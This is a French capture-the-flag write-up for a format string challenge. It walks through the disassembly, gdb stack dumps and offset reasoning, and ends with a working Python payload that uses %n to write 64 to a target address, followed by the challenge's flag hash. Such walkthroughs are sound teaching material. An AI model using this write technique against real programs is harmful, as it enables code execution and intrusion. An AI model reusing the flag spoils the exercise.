Le but du challenge est d'écrire `64` à l'adresse `0x804988c`:

```
080484a4 <v>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	81 ec 18 02 00 00    	sub    esp,0x218					; 536
 80484ad:	a1 60 98 04 08       	mov    eax,ds:0x8049860				; = stdin
 80484b2:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax		; stream
 80484b6:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200	; 512 = size
 80484bd:	00 
 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]				; on prend le pointeur de ebp-520.
 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax			; *s
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]				; *s
 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>			; print(*s) => string format vulnerability.
 80484da:	a1 8c 98 04 08       	mov    eax,ds:0x804988c				; grace au format string, on écrit dans la stack à cet adresse 40o.
 80484df:	83 f8 40             	cmp    eax,0x40
 80484e2:	75 34                	jne    8048518 <v+0x74>
 80484e4:	a1 80 98 04 08       	mov    eax,ds:0x8049880
 80484e9:	89 c2                	mov    edx,eax
 80484eb:	b8 00 86 04 08       	mov    eax,0x8048600
 80484f0:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 80484f4:	c7 44 24 08 0c 00 00 	mov    DWORD PTR [esp+0x8],0xc
 80484fb:	00 
 80484fc:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048503:	00 
 8048504:	89 04 24             	mov    DWORD PTR [esp],eax
 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
 804850c:	c7 04 24 0d 86 04 08 	mov    DWORD PTR [esp],0x804860d
 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
 8048518:	c9                   	leave  
 8048519:	c3                   	ret    
```

format string exploit
On a 8 octets pour passer de 520 pendant 512B à 0.
%x => destak 4 bytes => print 0x200				[ Sur la stack ]
%x => destask 4 bytes => print 0xb7fd1ac0		[ Sur ret adresse ]

Lorsque l'on utilise `x/100xw $sp`, on peut voir :
```
0xbffff510:	0xbffff520	0x00000200	0xb7fd1ac0
```

Sachant que `0xbffff520` contient notre input string. Par conséquent, si on utilise `%n`, on sait qu'on devrait avoir "11" écrit dans notre string. Testons.

`Program received signal SIGSEGV, Segmentation fault.` ça a fonctionné !

En balançant 512 fois la lettre "a", notre stack a cet état-là:
```
(gdb) x/100xw $sp
0xbffff510:	0xbffff520	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff520:	0x41414141	0x41414141	0x41414141	0x41414141
```

Donc, on peut faire :
`%x%x%x[padding]%n[padding][address]`

Comme ça, on destack `0x00000200`, puis `0xb7fd1ac0`, puis `0xb7ff37d0`. Après, on arrive sur notre adresse `0x41414141` que l'on a plus qu'à modifier par `0x804988c`. Notre objectif est de mettre le `%n` PILE quand on a écrit `64`.

Payload:
`%028x%028x%08x` => qui va écrire les 3 adresses, les deux première pendant 28 chars en complétant avec des 0, puis avec 8 caractères compléter avec des 0.

Avec ça, on obtient 64 caractères : `000000000000000000000000020000000000000000000000b7fd1ac0b7ff37d0`

Il ne reste plus qu'à insérer le `%n`, puis à mettre notre padding et notre adresse à la toute fin.
`%028x%028x%08x%n` fait 16 caractères, il nous en faut 508 pour pouvoir écrire l'adresse. On peut donc partir sur un padding de 492 caractères.

```py
print("%028x%028x%08x%n" + "A" * 492 + "\x8c\x98\x04\x08")
```

Et là ... problème, quand je lis la stack, je vois que mon adresse `0x0004988c` n'est pas au bon endroit dans la stack. Il faut donc inverser la payload. Nous n'aurons plus besoin de faire un "overflow".

```py
print("\x8c\x98\x04\x08" + "%028x%024x%08x%n")
```

Et ça fonctionne !

`b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`